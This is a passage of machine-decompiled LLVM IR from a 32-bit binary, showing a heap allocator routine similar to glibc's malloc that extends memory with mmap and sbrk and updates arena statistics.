  %v5_8053619 = select i1 %v8_805337f, i32 %v4_8053619, i32 %v0_8053613
  %v4_805361c = or i32 %v1_80536d6, 1
  store i32 %v5_8053619, i32* @global_var_8061890.496, align 16
  %v0_8053627 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_805361c, i32* %ebx.global-to-local, align 4
  %v1_805362d = or i32 %v0_8053627, 1
  store i32 %v1_805362d, i32* @edx, align 4
  %v3_8053630 = add i32 %v0_8053627, %v4_8053619
  %v4_8053630 = inttoptr i32 %v3_8053630 to i32*
  store i32 %v0_8053627, i32* %v4_8053630, align 4
  %v0_8053633 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053633 = load i32, i32* @ecx, align 4
  %v2_8053633 = add i32 %v1_8053633, 4
  %v3_8053633 = inttoptr i32 %v2_8053633 to i32*
  store i32 %v0_8053633, i32* %v3_8053633, align 4
  %v0_8053636 = load i32, i32* @edx, align 4
  %v1_8053636 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053636 = add i32 %v1_8053636, 4
  %v3_8053636 = inttoptr i32 %v2_8053636 to i32*
  store i32 %v0_8053636, i32* %v3_8053636, align 4
  br label %dec_label_pc_8053639

dec_label_pc_8053639:                             ; preds = %dec_label_pc_805372d, %dec_label_pc_80535eb, %dec_label_pc_80535f2
  %v0_8053639 = load i32, i32* @ecx, align 4
  %v1_8053639 = add i32 %v0_8053639, 8
  store i32 %v1_8053639, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053a61

dec_label_pc_8053641.loopexit:                    ; preds = %dec_label_pc_8053586
  br label %dec_label_pc_8053641

dec_label_pc_8053641:                             ; preds = %dec_label_pc_8053641.loopexit, %dec_label_pc_8053341, %dec_label_pc_8053349
  %v0_8053641 = load i32, i32* @global_var_806188c.495, align 4
  store i32 %v0_8053641, i32* @ebx, align 4
  store i32 %v1_80536d6, i32* %esi.global-to-local, align 4
  %v1_805364b = add i32 %v0_8053641, 4
  %v2_805364b = inttoptr i32 %v1_805364b to i32*
  %v3_805364b = load i32, i32* %v2_805364b, align 4
  %v1_805364e = add i32 %v1_80536d6, 16
  store i32 %v1_805364e, i32* @esi, align 4
  %v1_8053655 = and i32 %v3_805364b, -4
  store i32 %v1_8053655, i32* %ecx.global-to-local, align 4
  %v7_8053658 = icmp ult i32 %v1_8053655, %v1_805364e
  br i1 %v7_8053658, label %dec_label_pc_8053678, label %dec_label_pc_805365c

dec_label_pc_805365c:                             ; preds = %dec_label_pc_8053641
  %v2_8053660 = add i32 %v0_8053641, %v1_80536d6
  store i32 %v2_8053660, i32* @edx, align 4
  %v1_8053663 = or i32 %v1_80536d6, 1
  store i32 %v1_8053663, i32* %eax.global-to-local, align 4
  store i32 %v2_8053660, i32* @global_var_806188c.495, align 4
  store i32 %v1_8053663, i32* %v2_805364b, align 4
  %v0_805366f = load i32, i32* %ecx.global-to-local, align 4
  %v5_805366f = sub i32 %v0_805366f, %v1_80536d6
  store i32 %v5_805366f, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80539f1

dec_label_pc_8053678:                             ; preds = %dec_label_pc_8053641
  %v0_8053678 = load i8, i8* @global_var_8061860.494, align 32
  %v1_8053678 = and i8 %v0_8053678, 2
  %v2_8053678 = icmp eq i8 %v1_8053678, 0
  %v0_805367f = load i32, i32* @global_var_8061bbc.500, align 4
  store i32 %v0_805367f, i32* %edx.global-to-local, align 4
  br i1 %v2_8053678, label %dec_label_pc_80536ac, label %dec_label_pc_8053687

dec_label_pc_8053687:                             ; preds = %dec_label_pc_8053678
  store i32 ptrtoint (i8* @global_var_8061860.494 to i32), i32* %stack_var_-92, align 4
  %v2_805368f = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8061860.494 to i32*))
  store i32 ptrtoint (i8* @global_var_8061860.494 to i32), i32* @ebx, align 4
  %v1_8053699 = add i32 %v1_80536d6, -7
  store i32 %v1_8053699, i32* %eax.global-to-local, align 4
  store i32 %v1_8053699, i32* %stack_var_-92, align 4
  %v1_805369d = call i32 @malloc(i32 %v1_8053699)
  store i32 %v1_805369d, i32* %eax.global-to-local, align 4
  store i32 %v1_805369d, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053a61

dec_label_pc_80536ac:                             ; preds = %dec_label_pc_8053678
  store i32 %v1_80536d6, i32* @ebx, align 4
  %v1_80536b0 = add i32 %v0_805367f, -1
  store i32 %v1_80536b0, i32* @ecx, align 4
  %v1_80536b3 = load i32, i32* @global_var_8061bac.501, align 4
  %v7_80536b3 = icmp ult i32 %v1_80536d6, %v1_80536b3
  br i1 %v7_80536b3, label %dec_label_pc_805378e, label %dec_label_pc_80536c3

dec_label_pc_80536c3:                             ; preds = %dec_label_pc_80536ac
  %v0_80536c3 = load i32, i32* @global_var_8061bb0.502, align 16
  store i32 %v0_80536c3, i32* %eax.global-to-local, align 4
  %v1_80536c8 = load i32, i32* @global_var_8061bb4.503, align 4
  %v5_80536ce = icmp slt i32 %v0_80536c3, %v1_80536c8
  br i1 %v5_80536ce, label %dec_label_pc_80536d4, label %dec_label_pc_805378e

dec_label_pc_80536d4:                             ; preds = %dec_label_pc_80536c3
  %v2_80536d6 = add i32 %v1_80536d6, 10
  %v3_80536d6 = add i32 %v2_80536d6, %v0_805367f
  %v1_80536da = sub i32 0, %v0_805367f
  store i32 %v1_80536da, i32* %eax.global-to-local, align 4
  %v2_80536dc = and i32 %v3_80536d6, %v1_80536da
  store i32 %v2_80536dc, i32* @ebx, align 4
  %tmp139 = icmp ugt i32 %v2_80536dc, %v1_80536d6
  br i1 %tmp139, label %dec_label_pc_80536e8, label %dec_label_pc_805378e

dec_label_pc_80536e8:                             ; preds = %dec_label_pc_80536d4
  store i32 0, i32* %stack_var_-92, align 4
  %v8_80536f5 = call i32 @mmap(i32 0, i32 %v2_80536dc, i32 3, i32 34, i32 0, i32 0, i32 %v1_80536b0, i32 %v1_80536b0)
  store i32 %v8_80536f5, i32* %eax.global-to-local, align 4
  %v10_80536fd = icmp eq i32 %v8_80536f5, -1
  store i32 %v8_80536f5, i32* %edx.global-to-local, align 4
  br i1 %v10_80536fd, label %dec_label_pc_80536e8.dec_label_pc_805378e_crit_edge, label %dec_label_pc_8053708

dec_label_pc_80536e8.dec_label_pc_805378e_crit_edge: ; preds = %dec_label_pc_80536e8
  %v0_805378e.pre = load i32, i32* @global_var_806188c.495, align 4
  br label %dec_label_pc_805378e

dec_label_pc_8053708:                             ; preds = %dec_label_pc_80536e8
  %v1_805370a = urem i32 %v8_80536f5, 8
  %v2_805370a = icmp eq i32 %v1_805370a, 0
  store i32 %v1_805370a, i32* %ecx.global-to-local, align 4
  br i1 %v2_805370a, label %dec_label_pc_8053723, label %dec_label_pc_805370f

dec_label_pc_805370f:                             ; preds = %dec_label_pc_8053708
  %v0_8053714 = load i32, i32* @ebx, align 4
  %v2_8053716 = sub nsw i32 8, %v1_805370a
  store i32 %v2_8053716, i32* %eax.global-to-local, align 4
  %v2_8053718 = add i32 %v2_8053716, %v8_80536f5
  store i32 %v2_8053718, i32* @ecx, align 4
  %v2_805371b = sub i32 %v0_8053714, %v2_8053716
  store i32 %v2_805371b, i32* %esi.global-to-local, align 4
  %v2_805371d = inttoptr i32 %v2_8053718 to i32*
  store i32 %v2_8053716, i32* %v2_805371d, align 4
  br label %dec_label_pc_805372d

dec_label_pc_8053723:                             ; preds = %dec_label_pc_8053708
  store i32 %v8_80536f5, i32* @ecx, align 4
  %v1_8053725 = inttoptr i32 %v8_80536f5 to i32*
  store i32 0, i32* %v1_8053725, align 4
  br label %dec_label_pc_805372d

dec_label_pc_805372d:                             ; preds = %dec_label_pc_805370f, %dec_label_pc_8053723
  %storemerge.in = phi i32* [ @esi, %dec_label_pc_805370f ], [ @ebx, %dec_label_pc_8053723 ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_805372d = or i32 %storemerge, 2
  %v1_8053730 = load i32, i32* @ecx, align 4
  %v2_8053730 = add i32 %v1_8053730, 4
  %v3_8053730 = inttoptr i32 %v2_8053730 to i32*
  store i32 %v1_805372d, i32* %v3_8053730, align 4
  %v0_8053733 = load i32, i32* @global_var_8061bb0.502, align 16
  %v0_8053738 = load i32, i32* @global_var_8061bd0.504, align 16
  %v1_805373e = add i32 %v0_8053733, 1
  %v1_805373f = load i32, i32* @global_var_8061bb8.505, align 8
  %v2_805373f = sub i32 %v1_805373e, %v1_805373f
  %v8_805373f = xor i32 %v1_805373f, %v1_805373e
  %v9_805373f = xor i32 %v2_805373f, %v1_805373e
  %v10_805373f = and i32 %v9_805373f, %v8_805373f
  %v11_805373f = icmp slt i32 %v10_805373f, 0
  %v12_805373f = icmp eq i32 %v2_805373f, 0
  %v13_805373f = icmp slt i32 %v2_805373f, 0
  store i32 %v1_805373e, i32* @global_var_8061bb0.502, align 16
  %v3_805374a = icmp ne i1 %v13_805373f, %v11_805373f
  %v4_805374a = or i1 %v12_805373f, %v3_805374a
  %v7_805374a = select i1 %v4_805374a, i32 %v1_805373f, i32 %v1_805373e
  store i32 %v7_805374a, i32* @global_var_8061bb8.505, align 8
  %v0_8053756 = load i32, i32* @global_var_8061bc4.506, align 4
  %v1_805375b = load i32, i32* @ebx, align 4
  %v2_805375b = add i32 %v1_805375b, %v0_8053756
  store i32 %v2_805375b, i32* @global_var_8061bc4.506, align 4
  %tmp86 = icmp ule i32 %v2_805375b, %v0_8053738
  %v5_8053768 = select i1 %tmp86, i32 %v0_8053738, i32 %v2_805375b
  store i32 %v5_8053768, i32* @edx, align 4
  %v1_805376b = load i32, i32* @global_var_8061bc8.507, align 8
  %v2_805376b = add i32 %v1_805376b, %v2_805375b
  store i32 %v5_8053768, i32* @global_var_8061bd0.504, align 16
  %v1_8053777 = load i32, i32* @global_var_8061bd4.508, align 4
  %tmp140 = icmp ule i32 %v2_805376b, %v1_8053777
  %v5_805377d = select i1 %tmp140, i32 %v1_8053777, i32 %v2_805376b
  store i32 %v5_805377d, i32* %eax.global-to-local, align 4
  store i32 %v5_805377d, i32* @global_var_8061bd4.508, align 4
  br label %dec_label_pc_8053639

dec_label_pc_805378e:                             ; preds = %dec_label_pc_80536d4, %dec_label_pc_80536e8.dec_label_pc_805378e_crit_edge, %dec_label_pc_80536c3, %dec_label_pc_80536ac
  %v0_805378e = phi i32 [ %v0_805378e.pre, %dec_label_pc_80536e8.dec_label_pc_805378e_crit_edge ], [ %v0_8053641, %dec_label_pc_80536c3 ], [ %v0_8053641, %dec_label_pc_80536d4 ], [ %v0_8053641, %dec_label_pc_80536ac ]
  store i32 %v0_805378e, i32* %eax.global-to-local, align 4
  %v1_8053797 = add i32 %v0_805378e, 4
  %v2_8053797 = inttoptr i32 %v1_8053797 to i32*
  %v3_8053797 = load i32, i32* %v2_8053797, align 4
  %v1_805379e = and i32 %v3_8053797, -4
  %v2_805379e = icmp eq i32 %v1_805379e, 0
  store i32 %v1_805379e, i32* @ebp, align 4
  %v1_80537a4 = load i32, i32* @global_var_8061ba8.509, align 8
  %v0_80537ae = load i8, i8* @global_var_8061bc0.510, align 64
  %v1_80537ae = urem i8 %v0_80537ae, 2
  %v2_80537ae = icmp eq i8 %v1_80537ae, 0
  %v1_80537b5 = icmp eq i1 %v2_80537ae, false
  %v1_805379e.op = sub i32 0, %v1_805379e
  %v2_80537ac.neg = select i1 %v1_80537b5, i32 %v1_805379e.op, i32 0
  %v2_80537a4 = add i32 %v1_80536b0, %v1_805364e
  %v4_80537b5 = add i32 %v2_80537a4, %v1_80537a4
  %v5_80537bc = add i32 %v4_80537b5, %v2_80537ac.neg
  store i32 %v5_80537bc, i32* %eax.global-to-local, align 4
  %v1_80537c0 = sub i32 0, %v0_805367f
  store i32 %v1_80537c0, i32* @edx, align 4
  %v2_80537c4 = and i32 %v5_80537bc, %v1_80537c0
  store i32 %v2_80537c4, i32* @esi, align 4
  %tmp87 = icmp slt i32 %v2_80537c4, 1
  br i1 %tmp87, label %dec_label_pc_80537e2, label %dec_label_pc_80537cc

dec_label_pc_80537cc:                             ; preds = %dec_label_pc_805378e
  store i32 %v2_80537c4, i32* %stack_var_-92, align 4
  %v1_80537d0 = call i32 @__GI_sbrk(i32 %v2_80537c4)
  store i32 %v1_80537d0, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  %v10_80537db = icmp eq i32 %v1_80537d0, -1
  store i32 %v1_80537d0, i32* @ebx, align 4
  %v1_80537e0 = icmp eq i1 %v10_80537db, false
  br i1 %v1_80537e0, label %dec_label_pc_8053839, label %dec_label_pc_80537cc.dec_label_pc_80537e2_crit_edge

dec_label_pc_80537cc.dec_label_pc_80537e2_crit_edge: ; preds = %dec_label_pc_80537cc
  %v0_80537e2.pre = load i8, i8* @global_var_8061bc0.510, align 64
  br label %dec_label_pc_80537e2

dec_label_pc_80537e2:                             ; preds = %dec_label_pc_80537cc.dec_label_pc_80537e2_crit_edge, %dec_label_pc_805378e
  %v0_805380f = phi i32 [ -1, %dec_label_pc_80537cc.dec_label_pc_80537e2_crit_edge ], [ %v1_80537c0, %dec_label_pc_805378e ]
  %v0_80537e2 = phi i8 [ %v0_80537e2.pre, %dec_label_pc_80537cc.dec_label_pc_80537e2_crit_edge ], [ %v0_80537ae, %dec_label_pc_805378e ]
  %v1_80537e2 = urem i8 %v0_80537e2, 2
  %v2_80537e2 = icmp eq i8 %v1_80537e2, 0
  br i1 %v2_80537e2, label %dec_label_pc_80537e2.dec_label_pc_80537f7_crit_edge, label %dec_label_pc_80537eb

dec_label_pc_80537e2.dec_label_pc_80537f7_crit_edge: ; preds = %dec_label_pc_80537e2
  %v0_80537f7.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80537f7

dec_label_pc_80537eb:                             ; preds = %dec_label_pc_80537e2
  %v2_80537ef = add i32 %v1_805379e, %v1_80536b0
  store i32 %v2_80537ef, i32* %eax.global-to-local, align 4
  %v0_80537f1 = load i32, i32* @esi, align 4
  %v2_80537f1 = add i32 %v0_80537f1, %v2_80537ef
  %v5_80537f3 = and i32 %v2_80537f1, %v1_80537c0
  store i32 %v5_80537f3, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80537f7

dec_label_pc_80537f7:                             ; preds = %dec_label_pc_80537e2.dec_label_pc_80537f7_crit_edge, %dec_label_pc_80537eb
  %v3_8053802 = phi i32 [ %v0_80537f7.pre, %dec_label_pc_80537e2.dec_label_pc_80537f7_crit_edge ], [ %v5_80537f3, %dec_label_pc_80537eb ]
  store i32 1048576, i32* %eax.global-to-local, align 4
  %tmp88 = icmp ult i32 %v3_8053802, 1048576
  %v5_8053802 = select i1 %tmp88, i32 1048576, i32 %v3_8053802
  store i32 %v5_8053802, i32* @esi, align 4
  %tmp141 = icmp ugt i32 %v5_8053802, %v1_80536d6
  br i1 %tmp141, label %dec_label_pc_805380f, label %dec_label_pc_8053a54

dec_label_pc_805380f:                             ; preds = %dec_label_pc_80537f7
  store i32 0, i32* %stack_var_-92, align 4
  %v8_805381c = call i32 @mmap(i32 0, i32 %v5_8053802, i32 3, i32 34, i32 0, i32 0, i32 %v0_805380f, i32 %v0_805380f)
  store i32 %v8_805381c, i32* %eax.global-to-local, align 4
  %v10_8053824 = icmp eq i32 %v8_805381c, -1
  store i32 %v8_805381c, i32* @ebx, align 4
  br i1 %v10_8053824, label %dec_label_pc_8053a54, label %dec_label_pc_805382f

dec_label_pc_805382f:                             ; preds = %dec_label_pc_805380f
  %v0_805382f = load i8, i8* @global_var_8061bc0.510, align 1
  %v2_805382f = and i8 %v0_805382f, -2
  store i8 %v2_805382f, i8* @global_var_8061bc0.510, align 64
  %v1_8053836 = load i32, i32* @esi, align 4
  %v2_8053836 = add i32 %v1_8053836, %v8_805381c
  store i32 %v2_8053836, i32* @edx, align 4
  br label %dec_label_pc_8053839

dec_label_pc_8053839:                             ; preds = %dec_label_pc_80537cc, %dec_label_pc_805382f
  %v0_8053900 = phi i32 [ -1, %dec_label_pc_80537cc ], [ %v2_8053836, %dec_label_pc_805382f ]
  %v0_805390e = phi i32 [ %v1_80537d0, %dec_label_pc_80537cc ], [ %v8_805381c, %dec_label_pc_805382f ]
  %v10_8053839 = icmp eq i32 %v0_805390e, -1
  br i1 %v10_8053839, label %dec_label_pc_8053a54, label %dec_label_pc_8053842

dec_label_pc_8053842:                             ; preds = %dec_label_pc_8053839
  %v0_8053846 = load i32, i32* @global_var_8061bc8.507, align 8
  %v1_8053846 = load i32, i32* @esi, align 4
  %v2_8053846 = add i32 %v1_8053846, %v0_8053846
  store i32 %v2_8053846, i32* @global_var_8061bc8.507, align 8
  %v2_805384c = add i32 %v1_805379e, %v0_805378e
  store i32 %v2_805384c, i32* %ecx.global-to-local, align 4
  %v2_805384e = sub i32 %v0_805390e, %v2_805384c
  %v7_805384e = icmp ult i32 %v0_805390e, %v2_805384c
  %v12_805384e = icmp eq i32 %v2_805384e, 0
  %v1_8053850 = icmp eq i1 %v12_805384e, false
  br i1 %v1_8053850, label %dec_label_pc_8053869, label %dec_label_pc_8053852

dec_label_pc_8053852:                             ; preds = %dec_label_pc_8053842
  %v10_8053852 = icmp eq i32 %v0_8053900, -1
  %v1_8053855 = icmp eq i1 %v10_8053852, false
  br i1 %v1_8053855, label %dec_label_pc_8053869, label %dec_label_pc_8053857

dec_label_pc_8053857:                             ; preds = %dec_label_pc_8053852
  store i32 %v0_805378e, i32* %ecx.global-to-local, align 4
  %v2_805385b = add i32 %v1_8053846, %v1_805379e
  %v1_805385e = or i32 %v2_805385b, 1
  store i32 %v1_805385e, i32* %eax.global-to-local, align 4
  store i32 %v1_805385e, i32* %v2_8053797, align 4
  br label %dec_label_pc_8053996

dec_label_pc_8053869:                             ; preds = %dec_label_pc_8053852, %dec_label_pc_8053842
  %v0_8053869 = load i8, i8* @global_var_8061bc0.510, align 1
  %v1_8053869 = sext i8 %v0_8053869 to i32
  store i32 %v1_8053869, i32* %eax.global-to-local, align 4
  %v2_805386e = urem i8 %v0_8053869, 2
  %v3_805386e = icmp eq i8 %v2_805386e, 0
  br i1 %v3_805386e, label %dec_label_pc_8053882, label %dec_label_pc_8053872

dec_label_pc_8053872:                             ; preds = %dec_label_pc_8053869
  br i1 %v2_805379e, label %dec_label_pc_8053882, label %dec_label_pc_8053876

dec_label_pc_8053876:                             ; preds = %dec_label_pc_8053872
  %v1_8053878 = icmp eq i1 %v7_805384e, false
  br i1 %v1_8053878, label %dec_label_pc_8053882, label %dec_label_pc_805387a

dec_label_pc_805387a:                             ; preds = %dec_label_pc_8053876
  %v1_805387a = and i32 %v1_8053869, -2
  %v4_805387a = trunc i32 %v1_805387a to i8
  store i32 %v1_805387a, i32* %eax.global-to-local, align 4
  store i8 %v4_805387a, i8* @global_var_8061bc0.510, align 64
  br label %dec_label_pc_8053882

dec_label_pc_8053882:                             ; preds = %dec_label_pc_8053876, %dec_label_pc_8053872, %dec_label_pc_8053869, %dec_label_pc_805387a
  %v0_8053882 = phi i8 [ %v0_8053869, %dec_label_pc_8053876 ], [ %v0_8053869, %dec_label_pc_8053872 ], [ %v0_8053869, %dec_label_pc_8053869 ], [ %v4_805387a, %dec_label_pc_805387a ]
  %v1_8053882 = urem i8 %v0_8053882, 2
  %v2_8053882 = icmp eq i8 %v1_8053882, 0
  br i1 %v2_8053882, label %dec_label_pc_8053900, label %dec_label_pc_805388b

dec_label_pc_805388b:                             ; preds = %dec_label_pc_8053882
  br i1 %v2_805379e, label %dec_label_pc_8053899, label %dec_label_pc_805388f

dec_label_pc_805388f:                             ; preds = %dec_label_pc_805388b
  store i32 %v2_805384e, i32* %eax.global-to-local, align 4
  %v2_8053893 = add i32 %v2_8053846, %v2_805384e
  store i32 %v2_8053893, i32* @global_var_8061bc8.507, align 8
  br label %dec_label_pc_8053899

dec_label_pc_8053899:                             ; preds = %dec_label_pc_805388b, %dec_label_pc_805388f
  %v1_805389b = urem i32 %v0_805390e, 8
  %v2_805389b = icmp eq i32 %v1_805389b, 0
  store i32 %v1_805389b, i32* %edx.global-to-local, align 4
  %v1_805389e = icmp eq i1 %v2_805389b, false
  br i1 %v1_805389e, label %dec_label_pc_80538a6, label %dec_label_pc_80538a0

dec_label_pc_80538a0:                             ; preds = %dec_label_pc_8053899
  store i32 %v0_805390e, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80538b0

dec_label_pc_80538a6:                             ; preds = %dec_label_pc_8053899
  %v2_80538ab = sub nsw i32 8, %v1_805389b
  store i32 %v2_80538ab, i32* %eax.global-to-local, align 4
  %v2_80538ad = add i32 %v2_80538ab, %v0_805390e
  store i32 %v2_80538ad, i32* @edi, align 4
  br label %dec_label_pc_80538b0

dec_label_pc_80538b0:                             ; preds = %dec_label_pc_80538a0, %dec_label_pc_80538a6
  %v0_80538bd = phi i32 [ 0, %dec_label_pc_80538a0 ], [ %v2_80538ab, %dec_label_pc_80538a6 ]
  %v2_80538b0 = add i32 %v1_8053846, %v0_805390e
  %v2_80538bd = add i32 %v0_80538bd, %v1_805379e
  store i32 %v2_80538bd, i32* %ecx.global-to-local, align 4
  %v2_80538c0 = add i32 %v2_80538bd, %v2_80538b0
  store i32 %v2_80538c0, i32* %edx.global-to-local, align 4
  %v2_80538c2 = add i32 %v2_80538c0, %v1_80536b0
  %v5_80538c5 = and i32 %v2_80538c2, %v1_80537c0
  %v2_80538cc = sub i32 %v5_80538c5, %v2_80538c0
  store i32 %v2_80538cc, i32* %eax.global-to-local, align 4
  %v2_80538ce = add i32 %v2_80538cc, %v2_80538bd
  store i32 %v2_80538ce, i32* @esi, align 4
  store i32 %v2_80538ce, i32* %stack_var_-92, align 4
  %v1_80538d2 = call i32 @__GI_sbrk(i32 %v2_80538ce)
  store i32 %v1_80538d2, i32* %eax.global-to-local, align 4
  %v10_80538da = icmp eq i32 %v1_80538d2, -1
  store i32 %v1_80538d2, i32* %edx.global-to-local, align 4
  %v1_80538df = icmp eq i1 %v10_80538da, false
  br i1 %v1_80538df, label %dec_label_pc_80538ef, label %dec_label_pc_80538e1

dec_label_pc_80538e1:                             ; preds = %dec_label_pc_80538b0
  store i32 0, i32* %stack_var_-92, align 4
  %v1_80538e6 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_80538e6, i32* %eax.global-to-local, align 4
  store i32 %v1_80538e6, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053923

dec_label_pc_80538ef:                             ; preds = %dec_label_pc_80538b0
  %v1_80538ef = load i32, i32* @ebx, align 4
  %v7_80538ef = icmp ult i32 %v1_80538d2, %v1_80538ef
  %v1_80538f1 = icmp eq i1 %v7_80538ef, false
  br i1 %v1_80538f1, label %dec_label_pc_8053928, label %dec_label_pc_80538f3

dec_label_pc_80538f3:                             ; preds = %dec_label_pc_80538ef
  %v0_80538f3 = load i8, i8* @global_var_8061bc0.510, align 1
  %v2_80538f3 = and i8 %v0_80538f3, -2
  store i8 %v2_80538f3, i8* @global_var_8061bc0.510, align 64
  store i32 %v2_80538b0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053907

dec_label_pc_8053900:                             ; preds = %dec_label_pc_8053882
  %v10_8053900 = icmp eq i32 %v0_8053900, -1
  br i1 %v10_8053900, label %dec_label_pc_805390b, label %dec_label_pc_8053905

dec_label_pc_8053905:                             ; preds = %dec_label_pc_8053900
  store i32 %v0_805390e, i32* @edi, align 4
  br label %dec_label_pc_8053907

dec_label_pc_8053907:                             ; preds = %dec_label_pc_80538f3, %dec_label_pc_8053905
  %v0_805392847 = phi i32 [ %v2_80538b0, %dec_label_pc_80538f3 ], [ %v0_8053900, %dec_label_pc_8053905 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8053928

dec_label_pc_805390b:                             ; preds = %dec_label_pc_8053900
  store i32 %v0_805390e, i32* @edi, align 4
  store i32 0, i32* %stack_var_-92, align 4
  %v1_8053912 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8053912, i32* %edx.global-to-local, align 4
  %v1_8053919 = load i32, i32* @ebx, align 4
  %v2_8053919 = sub i32 %v1_8053912, %v1_8053919
  %v1_805391b = load i32, i32* @esi, align 4
  %v2_805391b = sub i32 %v2_8053919, %v1_805391b
  store i32 %v2_805391b, i32* %eax.global-to-local, align 4
  %v0_805391d = load i32, i32* @global_var_8061bc8.507, align 8
  %v2_805391d = add i32 %v0_805391d, %v2_805391b
  store i32 %v2_805391d, i32* @global_var_8061bc8.507, align 8
  br label %dec_label_pc_8053923

dec_label_pc_8053923:                             ; preds = %dec_label_pc_80538e1, %dec_label_pc_805390b
  %v0_805392846 = phi i32 [ %v1_80538e6, %dec_label_pc_80538e1 ], [ %v1_8053912, %dec_label_pc_805390b ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8053928

dec_label_pc_8053928:                             ; preds = %dec_label_pc_80538ef, %dec_label_pc_8053907, %dec_label_pc_8053923
  %v0_805392d = phi i32 [ %v1_80538d2, %dec_label_pc_80538ef ], [ %v0_805392847, %dec_label_pc_8053907 ], [ %v0_805392846, %dec_label_pc_8053923 ]
  %v10_8053928 = icmp eq i32 %v0_805392d, -1
  br i1 %v10_8053928, label %dec_label_pc_8053996, label %dec_label_pc_805392d

dec_label_pc_805392d:                             ; preds = %dec_label_pc_8053928
  %v1_805392d = load i32, i32* @edi, align 4
  %v2_805392d = sub i32 %v0_805392d, %v1_805392d
  store i32 %v2_805392d, i32* %edx.global-to-local, align 4
  %v1_805392f = load i32, i32* @esi, align 4
  %v2_805392f = add i32 %v1_805392f, %v2_805392d
  %v1_8053932 = or i32 %v2_805392f, 1
  store i32 %v1_8053932, i32* %eax.global-to-local, align 4
  store i32 %v1_805392d, i32* @global_var_806188c.495, align 4
  %v2_805393b = add i32 %v1_805392d, 4
  %v3_805393b = inttoptr i32 %v2_805393b to i32*
  store i32 %v1_8053932, i32* %v3_805393b, align 4
  %v0_805393e = load i32, i32* @global_var_8061bc8.507, align 8
  %v1_805393e = load i32, i32* @esi, align 4
  %v2_805393e = add i32 %v1_805393e, %v0_805393e
  store i32 %v2_805393e, i32* @global_var_8061bc8.507, align 8
  br i1 %v2_805379e, label %dec_label_pc_8053996, label %dec_label_pc_8053948

dec_label_pc_8053948:                             ; preds = %dec_label_pc_805392d
  store i32 %v0_805378e, i32* %ecx.global-to-local, align 4
  %v1_805394c = add i32 %v1_805379e, -12
  %v1_805394f = and i32 %v1_805394c, -8
  store i32 %v1_805394f, i32* %eax.global-to-local, align 4
  %v1_8053954 = or i32 %v1_805394f, 1
  store i32 %v1_8053954, i32* %edx.global-to-local, align 4
  %v5_8053957 = icmp ult i32 %v1_805394f, 15
  store i32 %v1_8053954, i32* %v2_8053797, align 4
  %v0_805395d = load i32, i32* %ecx.global-to-local, align 4
  %v1_805395d = load i32, i32* %eax.global-to-local, align 4
  %v2_805395d = add i32 %v0_805395d, 4
  %v3_805395d = add i32 %v2_805395d, %v1_805395d
  %v4_805395d = inttoptr i32 %v3_805395d to i32*
  store i32 5, i32* %v4_805395d, align 4
  %v0_8053965 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053965 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053965 = add i32 %v0_8053965, 8
  %v3_8053965 = add i32 %v2_8053965, %v1_8053965
  %v4_8053965 = inttoptr i32 %v3_8053965 to i32*
  store i32 5, i32* %v4_8053965, align 4
  br i1 %v5_8053957, label %dec_label_pc_8053996, label %dec_label_pc_805396f

dec_label_pc_805396f:                             ; preds = %dec_label_pc_8053948
  %v0_805396f = load i32, i32* @global_var_8061ba4.511, align 4
  store i32 %v0_805396f, i32* @ebx, align 4
  %v0_8053975 = load i32, i32* %ecx.global-to-local, align 4
  %v1_805397a = add i32 %v0_8053975, 8
  store i32 %v1_805397a, i32* %eax.global-to-local, align 4
  store i32 %v1_805397a, i32* %stack_var_-92, align 4
  store i32 -1, i32* @global_var_8061ba4.511, align 4
  %v1_8053988 = call i32 @free(i32 %v1_805397a)
  store i32 %v1_8053988, i32* %eax.global-to-local, align 4
  %v0_8053990 = load i32, i32* @ebx, align 4
  store i32 %v0_8053990, i32* @global_var_8061ba4.511, align 4
  br label %dec_label_pc_8053996

dec_label_pc_8053996:                             ; preds = %dec_label_pc_8053948, %dec_label_pc_805392d, %dec_label_pc_8053928, %dec_label_pc_8053857, %dec_label_pc_805396f
  %v0_8053996 = load i32, i32* @global_var_8061bc8.507, align 8
  %v0_805399b = load i32, i32* @global_var_8061bcc.512, align 4
  %v0_80539a7 = load i32, i32* @global_var_806188c.495, align 4
  store i32 %v0_80539a7, i32* @ebx, align 4
  %tmp89 = icmp ule i32 %v0_8053996, %v0_805399b
  %v5_80539ad = select i1 %tmp89, i32 %v0_805399b, i32 %v0_8053996
  store i32 %v5_80539ad, i32* @edx, align 4
  %v1_80539b0 = load i32, i32* @global_var_8061bc4.506, align 4
  %v2_80539b0 = add i32 %v1_80539b0, %v0_8053996
  store i32 %v5_80539ad, i32* @global_var_8061bcc.512, align 4
  %v1_80539bc = load i32, i32* @global_var_8061bd4.508, align 4
  %tmp90 = icmp ule i32 %v2_80539b0, %v1_80539bc
  %v5_80539c2 = select i1 %tmp90, i32 %v1_80539bc, i32 %v2_80539b0
  store i32 %v5_80539c2, i32* %eax.global-to-local, align 4
  store i32 %v5_80539c2, i32* @global_var_8061bd4.508, align 4
  %v1_80539ce = add i32 %v0_80539a7, 4
  %v2_80539ce = inttoptr i32 %v1_80539ce to i32*
  %v3_80539ce = load i32, i32* %v2_80539ce, align 4
  %v1_80539d1 = and i32 %v3_80539ce, -4
  store i32 %v1_80539d1, i32* @ecx, align 4
  %v10_80539d4 = icmp ult i32 %v1_80539d1, %v1_805364e
  br i1 %v10_80539d4, label %dec_label_pc_8053a54, label %dec_label_pc_80539da

